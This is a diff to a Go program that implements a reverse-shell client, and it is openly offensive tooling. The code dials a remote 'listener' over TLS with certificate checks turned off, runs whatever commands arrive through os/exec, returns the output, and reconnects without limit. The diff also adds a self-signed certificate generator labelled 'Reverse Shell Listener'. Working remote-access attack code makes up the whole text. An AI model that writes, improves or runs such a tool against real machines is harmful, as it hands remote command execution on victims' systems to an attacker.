@@ -2,16 +2,65 @@ package main
 
 import (
 	"bufio"
+	"crypto/rand"
+	"crypto/rsa"
 	"crypto/tls"
+	"crypto/x509"
+	"crypto/x509/pkix"
+	"encoding/pem"
 	"fmt"
 	"log"
-	"net/http"
+	"math/big"
 	"os"
 	"os/exec"
 	"runtime"
 	"strings"
 	"time"
 )
+
+// generateSelfSignedCert creates a self-signed TLS certificate on the fly
+func generateSelfSignedCert() (tls.Certificate, error) {
+	privateKey, err := rsa.GenerateKey(rand.Reader, 2048)
+	if err != nil {
+		return tls.Certificate{}, fmt.Errorf("failed to generate private key: %v", err)
+	}
+
+	notBefore := time.Now()
+	notAfter := notBefore.Add(365 * 24 * time.Hour)
+
+	serialNumber, err := rand.Int(rand.Reader, new(big.Int).Lsh(big.NewInt(1), 128))
+	if err != nil {
+		return tls.Certificate{}, fmt.Errorf("failed to generate serial number: %v", err)
+	}
+
+	template := x509.Certificate{
+		SerialNumber: serialNumber,
+		Subject: pkix.Name{
+			Organization:  []string{"Reverse Shell Listener"},
+			CommonName:   "localhost",
+		},
+		NotBefore:             notBefore,
+		NotAfter:              notAfter,
+		KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
+		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
+		BasicConstraintsValid: true,
+	}
+
+	certDER, err := x509.CreateCertificate(rand.Reader, &template, &template, &privateKey.PublicKey, privateKey)
+	if err != nil {
+		return tls.Certificate{}, fmt.Errorf("failed to create certificate: %v", err)
+	}
+
+	certPEM := pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: certDER})
+	keyPEM := pem.EncodeToMemory(&pem.Block{Type: "RSA PRIVATE KEY", Bytes: x509.MarshalPKCS1PrivateKey(privateKey)})
+
+	cert, err := tls.X509KeyPair(certPEM, keyPEM)
+	if err != nil {
+		return tls.Certificate{}, fmt.Errorf("failed to load certificate: %v", err)
+	}
+
+	return cert, nil
+}
 
 func executeCommand(command string) string {
 	var cmd *exec.Cmd
@@ -46,36 +95,31 @@ func getSystemInfo() string {
 }
 
 func connectToListener(target string) {
-	tr := &http.Transport{
-		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+	tlsConfig := &tls.Config{
+		InsecureSkipVerify: true,
 	}
-	client := &http.Client{
-		Transport: tr,
-		Timeout:   0,
-	}
-
-	url := fmt.Sprintf("https://%s/", target)
 	
-	log.Printf("Connecting to listener at %s...", url)
+	log.Printf("Connecting to listener at %s...", target)
 
-	req, err := http.NewRequest("GET", url, nil)
-	if err != nil {
-		log.Fatalf("Failed to create request: %v", err)
-	}
-
-	resp, err := client.Do(req)
+	conn, err := tls.Dial("tcp", target, tlsConfig)
 	if err != nil {
 		log.Fatalf("Failed to connect to listener: %v", err)
 	}
-	defer resp.Body.Close()
+	defer conn.Close()
 
 	log.Println("Connected to listener successfully")
 
-	scanner := bufio.NewScanner(resp.Body)
+	reader := bufio.NewReader(conn)
+	writer := bufio.NewWriter(conn)
 	
-	for scanner.Scan() {
-		command := scanner.Text()
-		command = strings.TrimSpace(command)
+	for {
+		line, err := reader.ReadString('\n')
+		if err != nil {
+			log.Printf("Connection error: %v", err)
+			break
+		}
+
+		command := strings.TrimSpace(line)
 
 		if command == "" {
 			continue
@@ -83,13 +127,15 @@ func connectToListener(target string) {
 
 		log.Printf("Received command: %s", command)
 
+		var output string
 		switch command {
 		case "INFO":
-			output := getSystemInfo()
-			fmt.Println(output)
-			fmt.Println("<<<END_OF_OUTPUT>>>")
+			output = getSystemInfo()
 
 		case "PING":
+			// Send acknowledgment
+			fmt.Fprintf(writer, "PONG\n")
+			writer.Flush()
 			continue
 
 		case "exit":
@@ -97,14 +143,13 @@ func connectToListener(target string) {
 			return
 
 		default:
-			output := executeCommand(command)
-			fmt.Println(output)
-			fmt.Println("<<<END_OF_OUTPUT>>>")
+			output = executeCommand(command)
 		}
-	}
-
-	if err := scanner.Err(); err != nil {
-		log.Printf("Connection error: %v", err)
+		
+		// Write output back to the connection
+		fmt.Fprintf(writer, "%s\n", output)
+		fmt.Fprintf(writer, "<<<END_OF_OUTPUT>>>\n")
+		writer.Flush()
 	}
 
 	log.Println("Disconnected from listener")
@@ -135,7 +180,7 @@ func connectWithRetry(target string, maxRetries int) {
 	}
 }
 
-func main() {
+func runReverseClientMain() {
 	if len(os.Args) != 3 {
 		fmt.Fprintf(os.Stderr, "Usage: %s <host:port|domain:port> <max-retries>\n", os.Args[0])
 		fmt.Fprintf(os.Stderr, "Example: %s 192.168.1.100:8443 0\n", os.Args[0])
@@ -153,4 +198,8 @@ func main() {
 	log.Printf("Max retries: %d (0 = infinite)", maxRetries)
 
 	connectWithRetry(target, maxRetries)
+}
+
+func main() {
+	runReverseClientMain()
 }
